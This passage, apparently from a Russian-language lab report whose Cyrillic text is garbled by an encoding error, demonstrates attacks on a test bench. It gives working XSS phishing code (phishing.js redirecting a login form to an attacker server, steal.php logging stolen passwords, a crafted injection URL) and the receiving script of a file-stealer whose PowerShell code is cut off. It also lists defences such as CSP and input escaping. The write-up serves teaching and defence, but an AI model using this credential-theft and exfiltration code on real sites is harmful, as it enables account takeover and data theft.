—á—Ç–æ–±—ã –≤–≤–µ–¥—ë–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª—è–ª–∏—Å—å –Ω–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏, –∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—â–µ–≥–æ.

–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç —Å–≤–æ–∏ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –ø—Ä–∏–≤—ã—á–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å, –Ω–µ –ø–æ–¥–æ–∑—Ä–µ–≤–∞—è, —á—Ç–æ –≤ —ç—Ç–æ—Ç –º–æ–º–µ–Ω—Ç –æ–Ω–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É.

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ 2 ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–µ–Ω–¥–∞ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π –∞—Ç–∞–∫–∏**

| IP-–∞–¥—Ä–µ—Å / –ü–æ—Ä—Ç    | –†–æ–ª—å                  | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------------------|----------------------|----------|
| `192.168.0.69:2222` | –í–µ–±-—Å–µ—Ä–≤–µ—Ä            | –°–∞–π—Ç –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏: —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è, –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç |
| `192.168.0.69:1111` | pgAdmin4              | –í–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è PostgreSQL |
| `192.168.0.69:5432` | PostgreSQL            | –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —Å–∞–π—Ç–∞ |
| `192.168.0.89`      | –ö–ª–∏–µ–Ω—Ç *(Windows 10)* | –ñ–µ—Ä—Ç–≤–∞ –∞—Ç–∞–∫–∏ ‚Äî –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤—É—é —Å—Å—ã–ª–∫—É |
| `192.168.0.114:1111`| –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Debian)* | –•–æ—Å—Ç–∏–Ω–≥ `phishing.js` –∏ `steal.php`, –ø—Ä–∏—ë–º –ª–æ–≥–∏–Ω–æ–≤/–ø–∞—Ä–æ–ª–µ–π –≤ `stolen_creds.txt` |

–ú–∞—à–∏–Ω–∞ —Å –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–æ–π –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–æ—á–Ω–æ —Ç–∞–∫–∞—è –∂–µ
–°—Ç–µ–Ω–¥ —Ä–∞–∑–≤—ë—Ä–Ω—É—Ç –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Docker Compose –∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω. –í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ –Ω–∞–±–æ—Ä–∞ PHP-—Å–∫—Ä–∏–ø—Ç–æ–≤:
- `register.php` ‚Äî —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è;  
- `login.php` ‚Äî –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è;  
- `dashboard.php` ‚Äî –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç;  
- `logout.php` ‚Äî –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏;  
- `db.php` ‚Äî –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ PostgreSQL.

---

### üõ† –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏

–£—è–∑–≤–∏–º–æ—Å—Ç—å **CWE-79 (XSS)** –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –º–∏–Ω–∏-—Å–∫—Ä–∏–ø—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –ø–æ–¥–≥—Ä—É–∂–∞–µ—Ç –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞ –∏ –ø–µ—Ä–µ–Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç –µ—ë —Ñ–æ—Ä–º—É. –í–≤–µ–¥—ë–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–µ–∑–∞–º–µ—Ç–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞.

**phishing.js**
```javascript
fetch("login.php")
  .then(res => res.text())
  .then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data;
    let form = document.getElementsByTagName("form")[0];
    if (form) {
      form.action = "http://192.168.0.114:1111/steal.php";
      form.method = "post";
    }
  });
```

–°–∫—Ä–∏–ø—Ç phishing.js –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ login.php, –∑–∞–º–µ–Ω—è–µ—Ç DOM —Ç–µ–∫—É—â–µ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∏ –ø–æ–¥–º–µ–Ω—è–µ—Ç –∞—Ç—Ä–∏–±—É—Ç—ã —Ñ–æ—Ä–º—ã: action —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ steal.php –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞, –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö –º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ POST

**steal.php**
```php
<?php
// steal.php
// –ü—Ä–∏–Ω–∏–º–∞–µ–º POST-–¥–∞–Ω–Ω—ã–µ –∏ –∑–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ —Ñ–∞–π–ª
file_put_contents('stolen_creds.txt', print_r($_POST, true), FILE_APPEND);

// –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∂–µ—Ä—Ç–≤e –Ω–∞ –∫–∞–∫—É—é-–Ω–∏–±—É–¥—å —Å—Ç—Ä–∞–Ω–∏—Ü—É (–∏–ª–∏ –ø–æ–∫–∞–∑–∞—Ç—å "–û—à–∏–±–∫–∞")
// –í—ã–≤–æ–¥–∏–º alert, –∑–∞—Ç–µ–º —Å—Ä–∞–∑—É —É–≤–æ–¥–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ dashboard.php
echo "<script>
  alert('Error 404');
  window.location.href = 'http://192.168.0.69:2222/dashboard.php';
</script>";
?>
```

–°–∫—Ä–∏–ø—Ç steal.php:
- –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –º–µ—Ç–æ–¥–æ–º POST;
- —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –∏—Ö –≤ stolen_creds.txt (—Ä–µ–∂–∏–º –¥–æ–ø–æ–ª–Ω–µ–Ω–∏—è);
- –∏–º–∏—Ç–∏—Ä—É–µ—Ç –æ—à–∏–±–∫—É ¬´Error 404¬ª –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç, —á—Ç–æ–±—ã –∑–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞—Ç—å –∞—Ç–∞–∫—É.

–ü–æ–¥–Ω–∏–º–∞–µ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä

**docker-compose.yml**
```
version: '3.8'
services:
  steal:
    build: .
    container_name: phishing_server163
    ports:
      - "1111:80"
```
**Dockerfile**
```
FROM php:8.1-apache

# –ö–æ–ø–∏—Ä—É–µ–º –≤—Å–µ —Ñ–∞–π–ª—ã –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞
COPY . /var/www/html/

# –ú–µ–Ω—è–µ–º –≤–ª–∞–¥–µ–ª—å—Ü–∞, —á—Ç–æ–±—ã Apache –º–æ–≥ —á–∏—Ç–∞—Ç—å/–ø–∏—Å–∞—Ç—å
RUN chown -R www-data:www-data /var/www/html
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π URL**
```http://192.168.0.69:2222/dashboard.php?payload=<script src="http://192.168.0.114:1111/phishing.js"></script>```

–ü–æ—Å–ª–µ URL-–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–¥–æ–±–Ω—É—é —Å—Å—ã–ª–∫—É –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Ä–∞—Å—Å—ã–ª–∞–µ—Ç –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–º –∂–µ—Ä—Ç–≤–∞–º ‚Äî –Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–æ –ø–æ—á—Ç–µ –∏–ª–∏ –≤ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–º –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–µ, –º–∞—Å–∫–∏—Ä—É—è –µ—ë –ø–æ–¥ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å–ª—É–∂–±—ã –ø–æ–¥–¥–µ—Ä–∂–∫–∏. –û—Ç–∫—Ä—ã–≤ —Å—Å—ã–ª–∫—É, –∂–µ—Ä—Ç–≤–∞ –≤–∏–¥–∏—Ç –æ–±—ã—á–Ω—É—é —Ñ–æ—Ä–º—É –≤—Ö–æ–¥–∞, –Ω–æ –µ—ë –¥–∞–Ω–Ω—ã–µ —É–∂–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏ –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç—Å—è –≤ stolen_creds.txt.

### üé• –í–∏–¥–µ–æ-–¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏
[–°–º–æ—Ç—Ä–µ—Ç—å –≤–∏–¥–µ–æ –≤ Google Drive](https://drive.google.com/file/d/1A0Uh9WIpx9KFe4nZnPX7zDC-92cl0SQB/view?usp=sharing)

## üõ° –ó–∞—â–∏—Ç–∞
–ó–∞—â–∏—Ç–∞ –æ—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π –∞—Ç–∞–∫–∏ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
-	–ø—Ä–æ–≤–µ—Ä–∫–∞ –∞–¥—Ä–µ—Å–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –ø–µ—Ä–µ–¥ –≤–≤–æ–¥–æ–º —É—á—ë—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –≤–∏–∑—É–∞–ª—å–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å –¥–æ–º–µ–Ω–Ω–æ–µ –∏–º—è –∏ –ø—Ä–æ—Ç–æ–∫–æ–ª HTTPS, –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ —Å—Å—ã–ª–∫–∞ –ø—Ä–∏—à–ª–∞ –ø–æ –ø–æ—á—Ç–µ –∏–ª–∏ –≤ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–µ;
-	–¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è (2FA). –î–∞–∂–µ –≤ —Å–ª—É—á–∞–µ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –ø–∞—Ä–æ–ª—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –Ω–µ —Å–º–æ–∂–µ—Ç –≤–æ–π—Ç–∏ –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞;
-	–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –ø–∞—Ä–æ–ª–µ–π. –ú–µ–Ω–µ–¥–∂–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ—Ç –ø–∞—Ä–æ–ª—å —Ç–æ–ª—å–∫–æ –Ω–∞ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–º –¥–æ–º–µ–Ω–µ –∏ –ø–æ–º–æ–≥–∞–µ—Ç –≤—ã—è–≤–∏—Ç—å –ø–æ–¥–¥–µ–ª—å–Ω—ã–π —Å–∞–π—Ç;
-	—Ñ–∏–ª—å—Ç—Ä—ã –ø–æ—á—Ç–æ–≤–æ–≥–æ –∫–ª–∏–µ–Ω—Ç–∞ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –∞–Ω—Ç–∏—Ñ–∏—à–∏–Ω–≥–∞. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–ª–∞–≥–∏–Ω–æ–≤, –±–ª–æ–∫–∏—Ä—É—é—â–∏—Ö –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ XSS –∏ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞—é—â–∏—Ö –æ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å—Å—ã–ª–∫–∞—Ö, —Å–Ω–∏–∂–∞–µ—Ç —Ä–∏—Å–∫ –ø–µ—Ä–µ—Ö–æ–¥–∞ –ø–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º—É URL;
-	–∫–∏–±–µ—Ä–≥–∏–≥–∏–µ–Ω–∞. –†–µ–≥—É–ª—è—Ä–Ω–æ–µ –æ–±—É—á–µ–Ω–∏–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∞ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏—é —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö –ø–∏—Å–µ–º, –ø—Ä–æ–≤–µ—Ä–∫–µ –≤–ª–æ–∂–µ–Ω–∏–π –∏ —Å—Å—ã–ª–æ–∫, —Å–æ–±–ª—é–¥–µ–Ω–∏—é –ø—Ä–∏–Ω—Ü–∏–ø–∞ ¬´–Ω–µ –¥–æ–≤–µ—Ä—è–π‚ÄØ‚Äì –ø—Ä–æ–≤–µ—Ä—è–π¬ª.
–ó–∞—â–∏—Ç–∞ –æ—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π –∞—Ç–∞–∫–∏ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
-	content security policy (CSP). –ñ—ë—Å—Ç–∫–∞—è –ø–æ–ª–∏—Ç–∏–∫–∞ script-src –∏ default-src –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–≥—Ä—É–∑–∫—É —Å–∫—Ä–∏–ø—Ç–æ–≤ —Ç–æ–ª—å–∫–æ —Å –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –¥–æ–º–µ–Ω–æ–≤, –±–ª–æ–∫—É—è –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫—É –≤–Ω–µ—à–Ω–∏—Ö —Ñ–∞–π–ª–æ–≤ –≤–∏–¥–∞ http://192.168.0.114:1111/phishing.js;
-	—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –∏ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞. –í–∞–ª–∏–¥–∞—Ü–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ URL –∏ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –∏—Å–∫–ª—é—á–∞–µ—Ç –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ JavaScript —á–µ—Ä–µ–∑ GET‚Äë–ø–∞—Ä–∞–º–µ—Ç—Ä—ã (payload);
-	HTTP‚Äë–∑–∞–≥–æ–ª–æ–≤–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –í–∫–ª—é—á–µ–Ω–∏–µ X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Referrer-Policy –∏ Strict-Transport-Security –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ XSS –∏ —Ñ–∏—à–∏–Ω–≥–∞;
-	–∞–Ω—Ç–∏—Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —à–ª—é–∑—ã –∏ –ø–æ—á—Ç–æ–≤—ã–µ —Ñ–∏–ª—å—Ç—Ä—ã. –ù–∞—Å—Ç—Ä–æ–π–∫–∞ DMARC, SPF –∏ DKIM —É–º–µ–Ω—å—à–∞–µ—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –¥–æ—Å—Ç–∞–≤–∫–∏ –ø–æ–¥–¥–µ–ª—å–Ω—ã—Ö –ø–∏—Å–µ–º –æ—Ç –∏–º–µ–Ω–∏ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞ [20];
-	–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –∂—É—Ä–Ω–∞–ª–∏—Ä–æ–≤–∞–Ω–∏–µ. –õ–æ–≥–∏ –≤–µ–±‚Äë—Å–µ—Ä–≤–µ—Ä–∞ –∏ IDS/IPS‚Äë—Å–∏—Å—Ç–µ–º—ã –ø–æ–∑–≤–æ–ª—è—é—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –∞–Ω–æ–º–∞–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã, —Å–æ–¥–µ—Ä–∂–∞—â–∏–µ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ <script>‚Äë—Ç–µ–≥–∏ –∏–ª–∏ —á–∞—Å—Ç—ã–µ –æ–±—Ä–∞—â–µ–Ω–∏—è –∫ steal.php;
-	–æ–±—É—á–µ–Ω–∏–µ –∏ —Ä–µ–≥–ª–∞–º–µ–Ω—Ç—ã —Ä–µ–∞–≥–∏—Ä–æ–≤–∞–Ω–∏—è. –†–µ–≥—É–ª—è—Ä–Ω—ã–µ –∫–∏–±–µ—Ä—É—á–µ–Ω–∏—è —Å –∏–º–∏—Ç–∞—Ü–∏–µ–π —Ñ–∏—à–∏–Ω–≥‚Äë—Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ –ø–æ–≤—ã—à–∞—é—Ç –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤ —Å–ª—É–∂–±—ã –ò–ë –∫ –±—ã—Å—Ç—Ä–æ–º—É –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—é –∏ –±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∏—é –ø–æ–¥–æ–±–Ω—ã—Ö –∞—Ç–∞–∫.


## 3 üìÇ –ê—Ç–∞–∫–∞ –º–µ—Ç–æ–¥–æ–º —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å –ø–æ–º–æ—â—å—é –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û (Stealer)

–°—Ç–∏–ª–ª–µ—Ä-–∞—Ç–∞–∫–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é —É—è–∑–≤–∏–º–æ—Å—Ç–∏ **CWE-200**. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª, –º–∞—Å–∫–∏—Ä—É—é—â–∏–π—Å—è –ø–æ–¥ –±–µ–∑–æ–±–∏–¥–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ. –ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –æ–Ω –Ω–µ–∑–∞–º–µ—Ç–Ω–æ —Å–æ–±–∏—Ä–∞–µ—Ç —Ñ–∞–π–ª—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∏—Ö –Ω–∞ —É–¥–∞–ª—ë–Ω–Ω—ã–π —Å–µ—Ä–≤–µ—Ä.  

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ 3 ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–µ–Ω–¥–∞ –¥–ª—è stealer-–∞—Ç–∞–∫–∏**

| IP-–∞–¥—Ä–µ—Å / –ü–æ—Ä—Ç    | –†–æ–ª—å                   | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------------------|-----------------------|----------|
| `192.168.0.89`      | –ö–ª–∏–µ–Ω—Ç *(Windows 10)* | –ñ–µ—Ä—Ç–≤–∞ ‚Äî –∑–∞–ø—É—Å–∫–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π `.exe`, —Å–æ–±–∏—Ä–∞—é—â–∏–π —Ñ–∞–π–ª—ã |
| `192.168.0.114:2222`| –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Debian)* | –•–æ—Å—Ç–∏–Ω–≥ `upload.php`, –ø—Ä–∏—ë–º —Ñ–∞–π–ª–æ–≤ –≤ –∫–∞—Ç–∞–ª–æ–≥ `uploads/` |

---

### üõ† –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏

1. –ù–∞ —Ä–∞–±–æ—á–µ–π —Å—Ç–∞–Ω—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª.  
2. –í —Ñ–æ–Ω–µ —É—Ç–∏–ª–∏—Ç–∞ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –æ–±—Ö–æ–¥–∏—Ç –∫–∞—Ç–∞–ª–æ–≥ **Desktop** –∏ –µ–≥–æ –ø–æ–¥–ø–∞–ø–∫–∏.  
3. –í—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã —É–ø–∞–∫–æ–≤—ã–≤–∞—é—Ç—Å—è –∏ –ø–æ–æ—á–µ—Ä—ë–¥–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –º–µ—Ç–æ–¥–æ–º `POST` –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞.  
4. –°–µ—Ä–≤–µ—Ä–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ `upload.php` –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ñ–∞–π–ª—ã –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –∏—Ö –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ `uploads/`.  
5. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞–º–µ—á–∞–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ ‚Äî –ø—Ä–æ—Ü–µ—Å—Å –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –±–µ–∑ –≤–∏–∑—É–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–∑–Ω–∞–∫–æ–≤.  

---

### üóÉ –°–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞

**upload.php**
```php
<?php
$targetDir = __DIR__ . "/uploads/";
if (!is_dir($targetDir)) {
    mkdir($targetDir, 0755, true);
}
if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $filename = basename($_FILES['file']['name']);
    $targetPath = $targetDir . $filename;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
        echo "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω: " . htmlspecialchars($filename);
    } else {
        echo "–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞.";
    }
} else {
    echo "–§–∞–π–ª –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω –∏–ª–∏ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ.";
    if (isset($_FILES['file']['error'])) {
        echo "<br>–ö–æ–¥ –æ—à–∏–±–∫–∏: " . $_FILES['file']['error'];
    }
}
?>
```

–°–∫—Ä–∏–ø—Ç –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞–ª–∏—á–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ uploads/, –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —Å–æ–∑–¥–∞—ë—Ç –µ—ë –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤—Å–µ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã. –í—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—á–∏—â–∞—é—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π basename, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –≤—ã—Ö–æ–¥ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã —Ü–µ–ª–µ–≤–æ–π –ø–∞–ø–∫–∏.
üìú –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å—Ç–∏–ª–ª–µ—Ä (PowerShell)

